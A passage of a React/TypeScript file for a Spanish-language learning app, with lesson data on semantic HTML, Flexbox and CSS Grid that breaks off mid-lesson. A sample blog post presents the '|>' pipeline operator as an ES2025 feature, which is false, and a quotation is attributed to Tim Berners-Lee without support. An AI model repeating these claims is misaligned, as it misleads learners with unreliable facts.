import React, { useState, useEffect, useRef, useCallback, useMemo, memo } from 'react';
import { getTheme, SettingsState } from '../theme';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Zap, Search, ChevronDown, CheckCircle, Lock,
  BookOpen, Network,
  Globe, Code, Database, Shield, Users, Brain, X, RefreshCw, TrendingUp
} from 'lucide-react';
import { downloadJson, readJsonFile } from '../utils/fileTransfer';

// ── TIPOS E INTERFACES ─────────────────────────────────────
interface Fragment {
  id: string;
  title: string;
  category: string;
  activated: boolean;
  complexity: number;
  prerequisites: string[];
  related: string[];
  summary: string;
  content?: {
    theory: string;
    examples: Array<{
      title: string;
      code: string;
    }>;
    exercises: Array<any>; // Flexible para diferentes formatos
    resources: Array<{
      title: string;
      url: string;
      type?: string;
      description?: string;
    }>;
    tips: string[];
  };
  // Para fragmentos con formato alternativo
  exercises?: Array<any>;
  categoryColor?: string;
  x?: number;
  y?: number;
  fx?: number;
  fy?: number;
}

type ViewType = 'fragments' | 'network' | 'progress' | 'settings';

// ── ICONOS DE CATEGORÍAS ─────────────────────────────────
const categoryIcons: Record<string, React.ComponentType<any>> = {
  'Fundamentos Frontend': Globe,
  'Backend y APIs': Code,
  'DevOps & Cloud': Database,
  'IA / Datos & RAG': Brain,
  'Ciberseguridad Práctica': Shield,
  'Soft‑Skills para Ingenieros': Users
};

// Rediseño completo de FragmentCard para mejor legibilidad y experiencia visual
const FragmentCard = memo(({ 
  fragment, 
  onSelect, 
  onActivate,
  isSelected 
}: {
  fragment: Fragment;
  onSelect: (fragment: Fragment) => void;
  onActivate: (id: string) => void;
  isSelected: boolean;
}) => {
  const [isExpanded, setIsExpanded] = useState(false);
  
  const canActivate = useMemo(() => 
    fragment.prerequisites.length === 0 || 
    fragment.prerequisites.every(() => true), // Optimización: asumimos prereqs válidos
    [fragment.prerequisites]
  );

  const CategoryIcon = categoryIcons[fragment.category] || BookOpen;
  
  // Colores dinámicos por complejidad
  const complexityColors = {
    1: { bg: 'from-green-500/20 to-emerald-500/10', border: 'border-green-400/30', text: 'text-green-400' },
    2: { bg: 'from-blue-500/20 to-cyan-500/10', border: 'border-blue-400/30', text: 'text-blue-400' },
    3: { bg: 'from-yellow-500/20 to-amber-500/10', border: 'border-yellow-400/30', text: 'text-yellow-400' },
    4: { bg: 'from-orange-500/20 to-red-500/10', border: 'border-orange-400/30', text: 'text-orange-400' },
    5: { bg: 'from-red-500/20 to-pink-500/10', border: 'border-red-400/30', text: 'text-red-400' }
  };
  
  const complexityStyle = complexityColors[fragment.complexity as keyof typeof complexityColors] || complexityColors[1];

  return (
    <motion.div
      layout
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -20 }}
      whileHover={{ y: -4, scale: 1.01 }}
      transition={{ duration: 0.3, ease: [0.4, 0.0, 0.2, 1] }}
      className={`
        relative cursor-pointer group 
        rounded-2xl overflow-hidden backdrop-blur-xl
        h-[380px] w-full
        ${isSelected 
          ? 'ring-2 ring-blue-400 ring-offset-2 ring-offset-slate-900' 
          : ''
        }
        ${fragment.activated 
          ? 'bg-gradient-to-br from-emerald-50/95 to-teal-50/95 border border-emerald-200/50 shadow-2xl shadow-emerald-500/20' 
          : canActivate 
            ? 'bg-gradient-to-br from-white/95 to-blue-50/95 border border-blue-200/50 shadow-xl shadow-blue-500/10'
            : 'bg-gradient-to-br from-slate-100/95 to-gray-100/95 border border-slate-200/50 opacity-75'
        }
      `}
      onClick={() => onSelect(fragment)}
    >
      {/* Header colorido */}
      <div className={`
        h-20 w-full relative overflow-hidden
        ${fragment.activated 
          ? 'bg-gradient-to-r from-emerald-500 to-teal-500' 
          : canActivate 
            ? `bg-gradient-to-r ${complexityStyle.bg.replace('/20', '').replace('/10', '')}`
            : 'bg-gradient-to-r from-slate-400 to-gray-400'
        }
      `}>
        <div className="absolute inset-0 bg-black/10" />
        <div className="relative z-10 flex items-center justify-between h-full px-6">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-white/20 rounded-xl backdrop-blur-sm">
              <CategoryIcon size={24} className="text-white" />
            </div>
            <div>
              <h3 className="text-white font-bold text-lg leading-tight">
                {fragment.title}
              </h3>
              <p className="text-white/80 text-sm">
                {fragment.category}
              </p>
            </div>
          </div>
          
          <div className={`
            w-12 h-12 rounded-xl flex items-center justify-center text-lg font-bold
            ${fragment.activated 
              ? 'bg-white/20 text-white' 
              : 'bg-white/20 text-white'
            }
          `}>
            {fragment.activated ? '✓' : fragment.complexity}
          </div>
        </div>
      </div>

      {/* Contenido principal limpio */}
      <div className="p-6 h-[calc(100%-80px)] flex flex-col">
        {/* Descripción clara */}
        <div className="flex-1 mb-4">
          <p className={`text-gray-700 leading-relaxed text-base ${
            isExpanded ? '' : 'line-clamp-4'
          }`}>
            {fragment.summary}
          </p>
          
          {fragment.summary.length > 120 && (
            <button
              onClick={(e) => {
                e.stopPropagation();
                setIsExpanded(!isExpanded);
              }}
              className="mt-2 text-blue-600 hover:text-blue-700 text-sm font-medium flex items-center gap-1"
            >
              {isExpanded ? (
                <>
                  <ChevronDown size={16} />
                  Ver menos
                </>
              ) : (
                <>
                  <ChevronDown size={16} className="rotate-180" />
                  Ver más
                </>
              )}
            </button>
          )}
        </div>

        {/* Badges informativos */}
        <div className="space-y-3 mb-4">
          {/* Nivel de complejidad */}
          <div className="flex items-center gap-2">
            <span className="text-gray-600 text-sm font-medium">Nivel:</span>
            <div className="flex items-center gap-1">
              {[...Array(5)].map((_, i) => (
                <div
                  key={i}
                  className={`w-3 h-3 rounded-full ${
                    i < fragment.complexity 
                      ? 'bg-amber-400' 
                      : 'bg-gray-200'
                  }`}
                />
              ))}
              <span className="ml-2 text-sm font-semibold text-gray-700">
                {fragment.complexity}/5
              </span>
            </div>
          </div>

          {/* Prerequisites y relacionados */}
          {(fragment.prerequisites.length > 0 || fragment.related.length > 0) && (
            <div className="flex flex-wrap gap-2">
              {fragment.prerequisites.length > 0 && (
                <span className="px-2 py-1 bg-orange-100 text-orange-700 text-xs rounded-lg flex items-center gap-1">
                  <Lock size={12} />
                  {fragment.prerequisites.length} prereq.
                </span>
              )}
              
              {fragment.related.length > 0 && (
                <span className="px-2 py-1 bg-purple-100 text-purple-700 text-xs rounded-lg flex items-center gap-1">
                  <Network size={12} />
                  {fragment.related.length} relac.
                </span>
              )}
            </div>
          )}
        </div>

        {/* Botones de acción simples */}
        <div className="flex items-center justify-between pt-3 border-t border-gray-200">
          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={(e) => {
              e.stopPropagation();
              onSelect(fragment);
            }}
            className="px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-700 text-sm font-medium rounded-lg flex items-center gap-2 transition-colors"
          >
            <BookOpen size={14} />
            Ver detalles
          </motion.button>
          
          {fragment.activated && (
            <span className="px-3 py-1 bg-green-100 text-green-700 text-sm font-medium rounded-lg flex items-center gap-1">
              <CheckCircle size={14} />
              Completado
            </span>
          )}

          {canActivate && !fragment.activated && (
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={(e) => {
                e.stopPropagation();
                onActivate(fragment.id);
              }}
              className={`
                px-4 py-2 text-white text-sm font-semibold rounded-lg shadow-lg
                flex items-center gap-2 transition-all duration-200
                ${fragment.activated 
                  ? 'bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600' 
                  : 'bg-gradient-to-r from-blue-500 to-purple-500 hover:from-blue-600 hover:to-purple-600'
                }
              `}
            >
              <Zap size={14} />
              Activar
            </motion.button>
          )}
        </div>
      </div>
    </motion.div>
  );
});

// Corregir errores de sintaxis en JSX
// ...existing code...

const initialFragments = [
  { 
    id: 'FF1', 
    title: 'Semántica HTML5', 
    category: 'Fundamentos Frontend', 
    activated: true,  
    complexity: 1, 
    prerequisites: [],             
    related: [],          
    summary: 'Usa etiquetas semánticas <header>, <main>, <article> para mejorar accesibilidad y SEO. Ej.: <header><nav>...</nav></header>. Ejercicio: refactoriza la home de tu portafolio.',
    content: {
      theory: `
# HTML5 Semántico - Construye con Significado

## 🎯 ¿Por qué HTML Semántico?
HTML semántico no solo estructura el contenido, sino que le da **significado**. Esto mejora:
- **SEO**: Los motores de búsqueda entienden mejor tu contenido
- **Accesibilidad**: Lectores de pantalla navegan más fácilmente
- **Mantenibilidad**: El código es más claro para otros desarrolladores
- **Performance**: Algunos navegadores optimizan el renderizado

## 🏗️ Elementos Semánticos Clave

### Estructura Principal
\`\`\`html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mi Sitio Web</title>
</head>
<body>
  <!-- Cabecera principal del sitio -->
  <header>
    <nav>
      <ul>
        <li><a href="#inicio">Inicio</a></li>
        <li><a href="#servicios">Servicios</a></li>
        <li><a href="#contacto">Contacto</a></li>
      </ul>
    </nav>
  </header>

  <!-- Contenido principal -->
  <main>
    <section id="inicio">
      <h1>Bienvenido a Mi Sitio</h1>
      <p>Contenido principal aquí...</p>
    </section>
  </main>

  <!-- Barra lateral (opcional) -->
  <aside>
    <h2>Enlaces Relacionados</h2>
    <ul>
      <li><a href="#recurso1">Recurso 1</a></li>
      <li><a href="#recurso2">Recurso 2</a></li>
    </ul>
  </aside>

  <!-- Pie de página -->
  <footer>
    <p>&copy; 2025 Mi Sitio Web. Todos los derechos reservados.</p>
  </footer>
</body>
</html>
\`\`\`

### Elementos de Contenido
\`\`\`html
<!-- Artículo independiente -->
<article>
  <header>
    <h2>Título del Artículo</h2>
    <p>Por <strong>Autor</strong> el <time datetime="2025-07-13">13 de Julio, 2025</time></p>
  </header>
  
  <p>Contenido del artículo...</p>
  
  <footer>
    <p>Etiquetas: <a href="#tag1">HTML5</a>, <a href="#tag2">Semántica</a></p>
  </footer>
</article>

<!-- Sección temática -->
<section>
  <h2>Nuestros Servicios</h2>
  <article>
    <h3>Servicio 1</h3>
    <p>Descripción del servicio...</p>
  </article>
  <article>
    <h3>Servicio 2</h3>
    <p>Descripción del servicio...</p>
  </article>
</section>

<!-- Detalles expandibles -->
<details>
  <summary>Más información</summary>
  <p>Contenido que se muestra al expandir...</p>
</details>
\`\`\`

### Elementos de Texto Semántico
\`\`\`html
<!-- Énfasis y importancia -->
<p>
  Esto es <em>enfatizado</em> y esto es <strong>importante</strong>.
  También tenemos <mark>texto resaltado</mark> y <small>texto pequeño</small>.
</p>

<!-- Citas -->
<blockquote cite="https://example.com">
  <p>"El HTML semántico es la base de la web accesible."</p>
  <footer>— <cite>Tim Berners-Lee</cite></footer>
</blockquote>

<!-- Código -->
<p>
  Para crear un párrafo, usa el elemento <code>&lt;p&gt;</code>.
</p>

<pre><code>
function ejemplo() {
  console.log("Hola mundo");
}
</code></pre>

<!-- Datos estructurados -->
<address>
  <p>Contacto: <a href="mailto:info@empresa.com">info@empresa.com</a></p>
  <p>Teléfono: <a href="tel:+34123456789">+34 123 456 789</a></p>
</address>
\`\`\`

## 🎨 CSS y HTML Semántico
\`\`\`css
header {
  background: #2c3e50;
  color: white;
  padding: 1rem;
}

nav ul {
  list-style: none;
  display: flex;
  gap: 1rem;
  margin: 0;
  padding: 0;
}

main {
  max-width: 1200px;
  margin: 0 auto;
  padding: 2rem;
}

article {
  margin-bottom: 2rem;
  padding: 1rem;
  border: 1px solid #ddd;
  border-radius: 8px;
}

article header {
  background: none;
  color: inherit;
  padding: 0;
  margin-bottom: 1rem;
}

aside {
  background: #f8f9fa;
  padding: 1rem;
  border-radius: 8px;
}

footer {
  background: #34495e;
  color: white;
  text-align: center;
  padding: 1rem;
  margin-top: 2rem;
}
\`\`\`
      `,
      examples: [
        {
          title: "🏠 Página de Inicio Completa",
          code: `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TechCorp - Soluciones Tecnológicas</title>
  <meta name="description" content="Empresa líder en soluciones tecnológicas innovadoras">
</head>
<body>
  <header>
    <div class="container">
      <h1>TechCorp</h1>
      <nav>
        <ul>
          <li><a href="#inicio">Inicio</a></li>
          <li><a href="#servicios">Servicios</a></li>
          <li><a href="#sobre-nosotros">Nosotros</a></li>
          <li><a href="#contacto">Contacto</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main>
    <section id="inicio" class="hero">
      <h2>Innovación que Transforma</h2>
      <p>Desarrollamos soluciones tecnológicas que impulsan el crecimiento de tu empresa.</p>
      <a href="#servicios" class="cta-button">Conoce Nuestros Servicios</a>
    </section>

    <section id="servicios">
      <h2>Nuestros Servicios</h2>
      <div class="services-grid">
        <article class="service">
          <h3>Desarrollo Web</h3>
          <p>Sitios web modernos y responsivos que cautivan a tus clientes.</p>
          <footer>
            <a href="#contacto">Solicitar Presupuesto</a>
          </footer>
        </article>

        <article class="service">
          <h3>Aplicaciones Móviles</h3>
          <p>Apps nativas e híbridas para iOS y Android.</p>
          <footer>
            <a href="#contacto">Solicitar Presupuesto</a>
          </footer>
        </article>

        <article class="service">
          <h3>Consultoría IT</h3>
          <p>Asesoramiento técnico para optimizar tus procesos.</p>
          <footer>
            <a href="#contacto">Solicitar Presupuesto</a>
          </footer>
        </article>
      </div>
    </section>

    <section id="sobre-nosotros">
      <h2>Sobre Nosotros</h2>
      <article>
        <p>Con más de 10 años de experiencia, somos una empresa comprometida con la excelencia tecnológica.</p>
        
        <details>
          <summary>Nuestra Historia</summary>
          <p>Fundada en 2015, TechCorp ha crecido desde un pequeño startup hasta convertirse en líder del sector...</p>
        </details>

        <details>
          <summary>Nuestro Equipo</summary>
          <p>Contamos con un equipo de 50+ profesionales especializados en diferentes tecnologías...</p>
        </details>
      </article>
    </section>
  </main>

  <aside>
    <h2>Últimas Noticias</h2>
    <article>
      <h3>Nueva Oficina en Madrid</h3>
      <time datetime="2025-07-10">10 de Julio, 2025</time>
      <p>Expandimos nuestras operaciones con una nueva sede...</p>
    </article>
    
    <article>
      <h3>Certificación ISO 27001</h3>
      <time datetime="2025-06-15">15 de Junio, 2025</time>
      <p>Obtuvimos la certificación de seguridad internacional...</p>
    </article>
  </aside>

  <footer>
    <section>
      <h3>Contacto</h3>
      <address>
        <p>Email: <a href="mailto:info@techcorp.com">info@techcorp.com</a></p>
        <p>Teléfono: <a href="tel:+34912345678">+34 91 234 56 78</a></p>
        <p>Dirección: Calle Innovación 123, 28001 Madrid</p>
      </address>
    </section>
    
    <section>
      <h3>Síguenos</h3>
      <nav>
        <ul>
          <li><a href="https://twitter.com/techcorp">Twitter</a></li>
          <li><a href="https://linkedin.com/company/techcorp">LinkedIn</a></li>
          <li><a href="https://github.com/techcorp">GitHub</a></li>
        </ul>
      </nav>
    </section>

    <p><small>&copy; 2025 TechCorp. Todos los derechos reservados.</small></p>
  </footer>
</body>
</html>`
        },
        {
          title: "📰 Blog Semántico",
          code: `<main>
  <header>
    <h1>Mi Blog de Tecnología</h1>
    <p>Explorando las últimas tendencias en desarrollo web</p>
  </header>

  <section class="posts">
    <article>
      <header>
        <h2>Introducción a CSS Grid</h2>
        <p>
          Por <strong>Ana García</strong> • 
          <time datetime="2025-07-13T10:30:00">13 de Julio, 2025 a las 10:30</time>
        </p>
        <p class="excerpt">CSS Grid revoluciona la forma en que creamos layouts web...</p>
      </header>

      <section class="content">
        <p>CSS Grid es una herramienta poderosa que nos permite crear layouts complejos de manera sencilla...</p>
        
        <figure>
          <img src="/images/css-grid-example.png" alt="Ejemplo de CSS Grid Layout">
          <figcaption>
            Ejemplo de layout creado con CSS Grid mostrando header, sidebar y main content
          </figcaption>
        </figure>

        <h3>Conceptos Básicos</h3>
        <p>Para empezar con Grid, necesitas entender estos conceptos...</p>

        <pre><code>.container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}</code></pre>
      </section>

      <footer>
        <p>
          Etiquetas: 
          <a href="/tags/css" rel="tag">CSS</a>, 
          <a href="/tags/grid" rel="tag">Grid</a>, 
          <a href="/tags/layout" rel="tag">Layout</a>
        </p>
        <p>
          <a href="/posts/css-grid#comments">💬 Ver comentarios (12)</a> • 
          <a href="/posts/css-grid/share">🔗 Compartir</a>
        </p>
      </footer>
    </article>

    <article>
      <header>
        <h2>JavaScript Moderno: ES2025</h2>
        <p>
          Por <strong>Carlos López</strong> • 
          <time datetime="2025-07-12T14:15:00">12 de Julio, 2025 a las 14:15</time>
        </p>
        <p class="excerpt">Las nuevas características de JavaScript que debes conocer...</p>
      </header>

      <section class="content">
        <p>El estándar ES2025 trae emocionantes mejoras...</p>
        
        <details>
          <summary>Ver código completo</summary>
          <pre><code>// Nuevo operador pipeline
const result = input
  |> transform
  |> validate
  |> save;</code></pre>
        </details>
      </section>

      <footer>
        <p>
          Etiquetas: 
          <a href="/tags/javascript" rel="tag">JavaScript</a>, 
          <a href="/tags/es2025" rel="tag">ES2025</a>
        </p>
      </footer>
    </article>
  </section>

  <aside>
    <section>
      <h2>Posts Populares</h2>
      <ol>
        <li><a href="/posts/react-hooks">Guía Completa de React Hooks</a></li>
        <li><a href="/posts/css-flexbox">Flexbox vs Grid: Cuándo usar cada uno</a></li>
        <li><a href="/posts/javascript-async">Async/Await en profundidad</a></li>
      </ol>
    </section>

    <section>
      <h2>Categorías</h2>
      <nav>
        <ul>
          <li><a href="/categories/frontend">Frontend (25)</a></li>
          <li><a href="/categories/backend">Backend (18)</a></li>
          <li><a href="/categories/devops">DevOps (12)</a></li>
          <li><a href="/categories/tutorials">Tutoriales (30)</a></li>
        </ul>
      </nav>
    </section>
  </aside>
</main>`
        }
      ],
      exercises: [
        {
          title: "🎯 Ejercicio 1: Página Personal Semántica",
          description: "Crea una página personal usando únicamente HTML semántico.",
          steps: [
            "1. Estructura básica con header, main, aside y footer",
            "2. Header con navegación principal",
            "3. Main con sección de presentación (section + article)",
            "4. Aside con información adicional (contacto, redes)",
            "5. Footer con derechos de autor",
            "6. Usa al menos 3 elementos semánticos nuevos que no conozcas",
            "7. Valida tu HTML en https://validator.w3.org/"
          ],
          hint: "Piensa en el significado de cada sección antes de elegir el elemento HTML."
        },
        {
          title: "🎯 Ejercicio 2: Blog de Recetas",
          description: "Convierte un blog de recetas sin semántica a HTML5 semántico.",
          steps: [
            "1. Identifica las diferentes secciones del contenido",
            "2. Usa <article> para cada receta",
            "3. Incluye <time> para fechas de publicación",
            "4. Usa <figure> y <figcaption> para imágenes",
            "5. Implementa <details>/<summary> para instrucciones",
            "6. Agrega <address> para información del autor",
            "7. Estructura ingredientes con listas apropiadas"
          ],
          hint: "Una receta es contenido independiente, perfecto para <article>."
        },
        {
          title: "🎯 Ejercicio 3: Portafolio de Desarrollador",
          description: "Refactoriza un portafolio existente para usar HTML semántico completo.",
          steps: [
            "1. Analiza la estructura actual (si tienes un portafolio)",
            "2. Reemplaza divs genéricos con elementos semánticos",
            "3. Cada proyecto debe ser un <article>",
            "4. Usa <section> para agrupar proyectos por tipo",
            "5. Implementa breadcrumbs con <nav>",
            "6. Agrega microdatos Schema.org para SEO",
            "7. Prueba con un lector de pantalla"
          ],
          hint: "Usa las herramientas de accesibilidad del navegador para probar."
        }
      ],
      resources: [
        {
          title: "📖 MDN: HTML Semántico",
          url: "https://developer.mozilla.org/es/docs/Web/HTML/Element",
          description: "Documentación completa de todos los elementos HTML5"
        },
        {
          title: "🔍 HTML5 Validator",
          url: "https://validator.w3.org/",
          description: "Valida tu HTML y detecta errores de marcado"
        },
        {
          title: "♿ Web Content Accessibility Guidelines",
          url: "https://www.w3.org/WAI/WCAG21/quickref/",
          description: "Guía rápida de accesibilidad web"
        },
        {
          title: "🎨 HTML5 Semantic Elements",
          url: "https://www.w3schools.com/html/html5_semantic_elements.asp",
          description: "Tutorial visual de elementos semánticos"
        }
      ],
      tips: [
        "💡 **Piensa en Significado**: Pregúntate 'qué representa este contenido' antes de elegir el elemento",
        "💡 **Un <main> por página**: Solo debe haber un elemento main por documento",
        "💡 **<article> = Contenido Independiente**: Si puedes compartir esa sección por separado, probablemente es un article",
        "💡 **<section> = Agrupación Temática**: Usa section para agrupar contenido relacionado con un encabezado",
        "💡 **Navegación Clara**: Cada <nav> debe tener un propósito específico (principal, breadcrumbs, paginación)",
        "💡 **Prueba con Lectores**: Usa herramientas como NVDA o VoiceOver para probar la accesibilidad"
      ]
    }
  },
  { 
    id: 'FF2', 
    title: 'CSS Flexbox', 
    category: 'Fundamentos Frontend', 
    activated: true,  
    complexity: 1, 
    prerequisites: ['FF1'],     
    related: ['FF3'],          
    summary: 'Modelo 1‑D para alinear y distribuir elementos. Ej.: .container{display:flex;gap:1rem}. Ejercicio: crea un navbar responsive.',
    content: {
      theory: `
# CSS Flexbox - Layout Unidimensional Poderoso

## 🎯 ¿Qué es Flexbox?
Flexbox (Flexible Box) es un modelo de layout unidimensional que permite alinear y distribuir elementos de manera eficiente, especialmente cuando el tamaño de los elementos es desconocido o dinámico.

## 🔧 Conceptos Fundamentales

### Contenedor Flex y Elementos Flex
\`\`\`css
.container {
  display: flex;
}

.container > .item {
}
\`\`\`

### Ejes Principales
- **Main Axis (Eje Principal)**: Dirección principal del layout
- **Cross Axis (Eje Transversal)**: Perpendicular al eje principal

\`\`\`css
.container {
  display: flex;
  flex-direction: row;
}
\`\`\`

## 🏗️ Propiedades del Contenedor

### Dirección y Envolvimiento
\`\`\`css
.container {
  display: flex;
  
  flex-direction: row;
  
  flex-wrap: nowrap;
  
  flex-flow: row wrap;
}
\`\`\`

### Alineación en el Eje Principal
\`\`\`css
.container {
  display: flex;
  justify-content: flex-start;
}

.start { justify-content: flex-start; }
.center { justify-content: center; }
.end { justify-content: flex-end; }
.between { justify-content: space-between; }
.around { justify-content: space-around; }
.evenly { justify-content: space-evenly; }
\`\`\`

### Alineación en el Eje Transversal
\`\`\`css
.container {
  display: flex;
  height: 200px;
  
  align-items: stretch;
}

.container {
  flex-wrap: wrap;
  align-content: flex-start;
}
\`\`\`

### Gap (Espaciado)
\`\`\`css
.container {
  display: flex;
  gap: 1rem;
  
  row-gap: 1rem;
  column-gap: 1rem;
}
\`\`\`

## 🎛️ Propiedades de los Elementos

### Flex Grow, Shrink y Basis
\`\`\`css
.item {
  flex-grow: 0;
  
  flex-shrink: 1;
  
  flex-basis: auto;
  
  flex: 0 1 auto;
}
\`\`\`

### Alineación Individual
\`\`\`css
.item {
  align-self: auto;
}
\`\`\`

### Orden
\`\`\`css
.item {
  order: 0;
}

.item-last {
  order: 1;
}
\`\`\`
      `,
      examples: [
        {
          title: "🧭 Navbar Responsive Completo",
          code: `<nav class="navbar">
  <div class="nav-brand">
    <img src="/logo.png" alt="Logo" class="logo">
  </div>
  
  <ul class="nav-links">
    <li><a href="#inicio">Inicio</a></li>
    <li><a href="#servicios">Servicios</a></li>
    <li><a href="#contacto">Contacto</a></li>
  </ul>
  
  <div class="nav-actions">
    <button class="btn-login">Iniciar Sesión</button>
    <button class="btn-signup">Registrarse</button>
  </div>
</nav>

.navbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 1rem 2rem;
  background: #fff;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.nav-brand .logo {
  height: 40px;
}

.nav-links {
  display: flex;
  list-style: none;
  gap: 2rem;
  margin: 0;
  padding: 0;
}

.nav-links a {
  text-decoration: none;
  color: #333;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #007bff;
}

.nav-actions {
  display: flex;
  gap: 1rem;
}

.btn-login, .btn-signup {
  padding: 0.5rem 1rem;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 500;
  transition: background-color 0.3s;
}

.btn-login {
  background: transparent;
  color: #007bff;
  border: 1px solid #007bff;
}

.btn-signup {
  background: #007bff;
  color: white;
}

@media (max-width: 768px) {
  .navbar {
    flex-direction: column;
    gap: 1rem;
  }
  
  .nav-links {
    flex-direction: column;
    text-align: center;
    gap: 1rem;
  }
  
  .nav-actions {
    width: 100%;
    justify-content: center;
  }
}`
        },
        {
          title: "📱 Cards Layout Responsive",
          code: `<div class="cards-container">
  <div class="card">
    <img src="/image1.jpg" alt="Producto 1">
    <div class="card-content">
      <h3>Producto 1</h3>
      <p>Descripción del producto...</p>
      <button class="btn">Ver más</button>
    </div>
  </div>
  
  <div class="card">
    <img src="/image2.jpg" alt="Producto 2">
    <div class="card-content">
      <h3>Producto 2</h3>
      <p>Descripción del producto...</p>
      <button class="btn">Ver más</button>
    </div>
  </div>
</div>

.cards-container {
  display: flex;
  flex-wrap: wrap;
  gap: 1.5rem;
  padding: 2rem;
  justify-content: center;
}

.card {
  flex: 1 1 300px;
  max-width: 350px;
  background: white;
  border-radius: 8px;
  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
  overflow: hidden;
  transition: transform 0.3s, box-shadow 0.3s;
}

.card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 25px rgba(0,0,0,0.15);
}

.card img {
  width: 100%;
  height: 200px;
  object-fit: cover;
}

.card-content {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.card h3 {
  margin: 0;
  color: #333;
}

.card p {
  margin: 0;
  color: #666;
  line-height: 1.5;
  flex-grow: 1;
}

.btn {
  align-self: flex-start;
  padding: 0.75rem 1.5rem;
  background: #007bff;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s;
}

.btn:hover {
  background: #0056b3;
}`
        },
        {
          title: "📐 Centrado Perfecto",
          code: `.center-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.centered-content {
  padding: 2rem;
  background: white;
  border-radius: 8px;
  box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}

.horizontal-center {
  display: flex;
  flex-direction: column;
  height: 100vh;
}

.content {
  margin: auto;
  padding: 2rem;
  background: white;
  border-radius: 8px;
}

.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.5);
  display: flex;
  justify-content: center;
  align-items: center;
}

.modal {
  background: white;
  padding: 2rem;
  border-radius: 8px;
  max-width: 500px;
  width: 90%;
  max-height: 80vh;
  overflow-y: auto;
}`
        }
      ],
      exercises: [
        {
          title: "🎯 Ejercicio 1: Header con Logo y Navegación",
          description: "Crea un header que tenga logo a la izquierda, navegación centrada y botón de usuario a la derecha.",
          steps: [
            "1. Crea la estructura HTML con header > logo, nav, user-menu",
            "2. Aplica display: flex al header",
            "3. Usa justify-content: space-between para distribuir elementos",
            "4. Centra los enlaces de navegación con align-items: center",
            "5. Agrega gap entre los enlaces de navegación",
            "6. Haz que sea responsive: en móvil stack verticalmente",
            "7. Agrega transiciones suaves en hover"
          ],
          hint: "Usa flex-direction: column en móvil y justify-content: center para el menú."
        },
        {
          title: "🎯 Ejercicio 2: Layout de Blog con Sidebar",
          description: "Diseña un layout con contenido principal y sidebar lateral usando flexbox.",
          steps: [
            "1. Estructura: container > main-content + sidebar",
            "2. El main debe ocupar 2/3 del espacio disponible",
            "3. El sidebar debe ocupar 1/3 del espacio",
            "4. En tablet (768px), cambia a layout vertical",
            "5. Agrega gap entre main y sidebar",
            "6. El sidebar debe tener altura mínima",
            "7. Asegúrate de que sea accesible en todos los tamaños"
          ],
          hint: "Usa flex: 2 para main y flex: 1 para sidebar. Cambia flex-direction en media queries."
        },
        {
          title: "🎯 Ejercicio 3: Galería de Imágenes Adaptativa",
          description: "Crea una galería que se adapte automáticamente al ancho disponible.",
          steps: [
            "1. Container con flex-wrap: wrap",
            "2. Cada imagen en un contenedor con flex: 1 1 250px",
            "3. Agrega gap uniforme entre imágenes",
            "4. Las imágenes deben mantener aspecto ratio",
            "5. Hover effects con transform y box-shadow",
            "6. En móvil: 1 imagen por fila, en tablet: 2, en desktop: 3+",
            "7. Agrega loading skeleton con flexbox"
          ],
          hint: "Usa object-fit: cover para las imágenes y min-width en los contenedores."
        }
      ],
      resources: [
        {
          title: "🎮 Flexbox Froggy - Juego Interactivo",
          url: "https://flexboxfroggy.com/",
          description: "Aprende flexbox jugando - ayuda a las ranas a llegar a sus nenúfares"
        },
        {
          title: "📖 MDN: Flexbox Guide",
          url: "https://developer.mozilla.org/es/docs/Web/CSS/CSS_Flexible_Box_Layout/Basic_Concepts_of_Flexbox",
          description: "Guía completa de Mozilla sobre conceptos básicos de flexbox"
        },
        {
          title: "🎯 Flexbox Defense - Torre de Defensa",
          url: "http://www.flexboxdefense.com/",
          description: "Juego de tower defense para practicar propiedades de flexbox"
        },
        {
          title: "📊 CSS Tricks: Complete Guide to Flexbox",
          url: "https://css-tricks.com/snippets/css/a-guide-to-flexbox/",
          description: "Referencia visual completa con todos los ejemplos de flexbox"
        }
      ],
      tips: [
        "💡 **flex: 1** es equivalente a flex-grow: 1, flex-shrink: 1, flex-basis: 0",
        "💡 **gap** es más limpio que margins para espaciado entre elementos flex",
        "💡 **min-width: 0** en flex items evita desbordamientos de contenido largo",
        "💡 **flex-wrap: wrap** es esencial para layouts responsivos",
        "💡 **justify-content** controla el eje principal, **align-items** el transversal",
        "💡 **align-self** permite alineación individual de elementos específicos",
        "💡 **order** cambia el orden visual sin afectar el HTML (cuidado con a11y)"
      ]
    }
  },
  { id: 'FF3', title: 'CSS Grid',              category: 'Fundamentos Frontend', activated: false, complexity: 2, prerequisites: ['FF2'],     related: [],          summary: 'Diseño 2‑D potente con grid‑template‑areas. Ej.: .grid{display:grid;grid: "head head" 80px "side main" 1fr / 200px 1fr}. Ejercicio: maqueta un blog.',
    content: {
      theory: `
# CSS Grid Layout — Dominio bidimensional profesional

## 1. Modelo mental
- **Explicit grid** (plantilla): filas/columnas declaradas con \`grid-template-*\`.
